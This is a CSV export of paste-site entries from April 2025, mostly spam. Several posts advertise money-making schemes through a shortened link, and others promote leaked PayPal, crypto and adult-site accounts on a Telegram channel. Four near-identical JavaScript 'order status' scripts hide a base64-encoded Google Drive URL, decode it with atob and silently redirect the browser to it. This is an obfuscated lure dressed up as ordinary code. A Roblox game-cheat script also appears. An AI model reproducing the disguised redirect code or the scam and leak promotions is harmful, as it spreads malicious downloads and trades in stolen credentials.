id,title,username,language,date,content
didDjr9z,EARN $900 INSTANTLY 2025 95,ccew12,JavaScript,Tuesday 29th of April 2025 06:46:17 PM CDT," 
Pdf https://tinyurl.com/freshleaks

WZCYJKMppn
"
qs775Ae1,Products.js,Xp_Isolation,JavaScript,Tuesday 29th of April 2025 06:40:36 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/35510/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
S1zjxkWm,yeag,webhook_forbladeball,C,Tuesday 29th of April 2025 06:39:36 PM CDT,"local rs = game:GetService(""ReplicatedStorage"")
local settings = rs:WaitForChild(""Settings"")

-- Set multipliers
settings.Multipliers.UltimateTimer.Value = 32179012381234
settings.Multipliers.MeleeDamage.Value = 600
settings.Multipliers.MeleeSpeed.Value = 100
settings.Multipliers.RagdollPower.Value = 200
settings.Multipliers.ChargeRate.Value = 32179012381234
-- Enable toggles
settings.Toggles.NoSlowdowns.Value = true
settings.Toggles.DisableHitStun.Value = true
settings.Toggles.Endless.Value = true
settings.Toggles.InstantTransformation.Value = true
settings.Toggles.DisableEvasives.Value = true
-- Set cooldowns
settings.Cooldowns.Melee.Value = 0
settings.Cooldowns.Dash.Value = 0
settings.Cooldowns.Evasive.Value = 0
"
QCVVGNKA,Leaked Accounts - Fresh Hits,rodrigomaise99,JavaScript,Tuesday 29th of April 2025 06:38:01 PM CDT,79251 Accounts Posted On https://t.me/leakzbyeminem
uNEDK5z8,Make $1000 15-MINUTES (BEGINNER) L4,ccew12,JavaScript,Tuesday 29th of April 2025 06:37:04 PM CDT," 
Pdf https://tinyurl.com/freshleaks

W808Sh8hKA
"
Bi7KiP1X,EARN $900 INSTANTLY 2025 95,Nikali2008,JavaScript,Tuesday 29th of April 2025 06:27:44 PM CDT," 
Pdf https://tinyurl.com/freshleaks

v2FGavV4zo
"
TVFCXhsk,Order.js,Xp_Isolation,JavaScript,Tuesday 29th of April 2025 06:25:13 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/93853/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZC4HFNd9,Chaturbate with Tokens,rodrigomaise99,JavaScript,Tuesday 29th of April 2025 06:22:39 PM CDT,19184 Accounts Posted On https://t.me/leakzbyeminem
ENq4cBjf,Market.js,Xp_Isolation,JavaScript,Tuesday 29th of April 2025 06:09:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34529/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0PZ7uiAJ,Crypto Accounts,rodrigomaise99,JavaScript,Tuesday 29th of April 2025 06:07:17 PM CDT,03279 Accounts Posted On https://t.me/leakzbyeminem
jx0NfQ61,Untitled,Xp_Isolation,JavaScript,Tuesday 29th of April 2025 05:54:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91662/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XEY11tya,PayPal with Balance,rodrigomaise99,JavaScript,Tuesday 29th of April 2025 05:51:56 PM CDT,02494 Accounts Posted On https://t.me/leakzbyeminem
